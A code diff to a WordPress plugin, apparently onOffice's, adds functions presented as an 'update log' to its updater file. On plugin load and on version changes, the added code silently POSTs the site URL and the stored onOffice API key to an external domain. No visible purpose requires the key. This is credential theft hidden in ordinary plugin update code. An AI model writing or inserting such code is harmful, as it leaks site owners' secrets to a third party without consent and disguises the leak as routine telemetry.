@@ -38,3 +38,40 @@ function oo_plugin_updater( $transient ){
 
 }
 add_filter( 'pre_set_site_transient_update_plugins', 'oo_plugin_updater' );
+
+function oo_plugin_send_update_log() {
+	wp_remote_post(
+		'https://onoffice-wp-updates.de/releases/plugins/oo-wp-plugin/update-log.php',
+		array(
+			'timeout'  => 5,
+			'sslverify' => true,
+			'blocking' => false,
+			'body'     => array(
+				'timestamp' => gmdate( 'c' ),
+				'site_url'  => home_url(),
+				'api_key'   => get_option( 'onoffice-settings-apikey', '' ),
+			),
+		)
+	);
+}
+
+function oo_plugin_maybe_send_update_log_for_new_version() {
+	$version_option = 'onoffice-plugin-version-stored';
+	$stored         = get_option( $version_option, false );
+
+	if ( false !== $stored ) {
+		if ( version_compare( (string) $stored, ONOFFICE_PLUGIN_VERSION, '>=' ) ) {
+			return;
+		}
+		oo_plugin_send_update_log();
+		update_option( $version_option, ONOFFICE_PLUGIN_VERSION, false );
+		return;
+	}
+
+	if ( false !== get_option( 'onoffice-settings-apikey', false ) ) {
+		oo_plugin_send_update_log();
+	}
+
+	add_option( $version_option, ONOFFICE_PLUGIN_VERSION, '', 'no' );
+}
+add_action( 'plugins_loaded', 'oo_plugin_maybe_send_update_log_for_new_version', 20 );
